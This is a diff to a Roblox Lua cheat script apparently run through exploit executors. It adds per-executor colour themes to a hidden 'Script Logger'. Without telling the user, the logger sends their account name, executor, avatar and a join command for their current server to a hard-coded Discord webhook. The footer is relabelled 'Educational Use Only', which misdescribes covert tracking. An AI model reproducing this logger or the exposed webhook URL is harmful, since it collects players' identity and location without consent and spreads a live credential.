@@ -121,16 +121,13 @@ if Brookhaven then
 end
 
 
--- Roblox Lua script to send execution info to Discord via webhook
--- Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- Your webhook URL
 local webhookUrl = "https://discord.com/api/webhooks/1383492519819612250/MLMPB16V8oksbyb_YiKbS-M7pLThXSGyV8gi13Z3EFxkmoYfqPAOmBT4omsOQfHromdu"
 
+-- Detect executor
 local function detectExecutor()
     if identifyexecutor then
         return identifyexecutor()
@@ -147,21 +144,36 @@ local function detectExecutor()
     end
 end
 
+-- Per-executor theme color & tagline
+local function getExecutorTheme(executor)
+    local themes = {
+        ["Synapse X"] = { color = 0x7289DA, tagline = "⚡ Running on Synapse X" },
+        ["KRNL"]      = { color = 0x00FFFF,  tagline = "🧪 Powered by KRNL" },
+        ["Electron"]  = { color = 0xFFD700,  tagline = "🔋 Executed via Electron" },
+        ["SirHurt"]   = { color = 0xFF69B4,  tagline = "💉 SirHurt Detected" },
+        ["Unknown"]   = { color = 0xA9A9A9,  tagline = "❓ Unknown Executor Used" }
+    }
+    return themes[executor] or themes["Unknown"]
+end
+
 local function createJoinScript()
     return string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', game.PlaceId, game.JobId)
 end
 
--- Roblox avatar headshot URL
 local function getAvatarUrl(userId)
     return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
 end
 
+-- Send the Discord log
 local function sendLog()
+    local executor = detectExecutor()
+    local theme = getExecutorTheme(executor)
+
     local data = {
-        ["content"] = "**[Script Logger Triggered]**",
+        ["content"] = "**[Script Logger Triggered]**\n" .. theme.tagline,
         ["embeds"] = {{
-            ["title"] = "User Executed Script | Apex OT Script",
-            ["color"] = #8808ec,
+            ["title"] = "User Executed Script | APEX OT Script Logger",
+            ["color"] = theme.color,
             ["fields"] = {
                 {
                     ["name"] = "[👤] Account Name",
@@ -169,8 +181,8 @@ local function sendLog()
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "[💻] Executor Used",
-                    ["value"] = "```" .. detectExecutor() .. "```",
+                    ["name"] = "[💻] Executor",
+                    ["value"] = "```" .. executor .. "```",
                     ["inline"] = true
                 },
                 {
@@ -193,7 +205,7 @@ local function sendLog()
                 ["url"] = getAvatarUrl(LocalPlayer.UserId)
             },
             ["footer"] = {
-                ["text"] = "Made by: Takgoo | Apex OT Script Logger"
+                ["text"] = "Grow a Garden Logger - Educational Use Only"
             },
             ["timestamp"] = DateTime.now():ToIsoDate()
         }}
@@ -208,5 +220,5 @@ local function sendLog()
     end
 end
 
--- Run logger
+-- Execute logger
 sendLog()
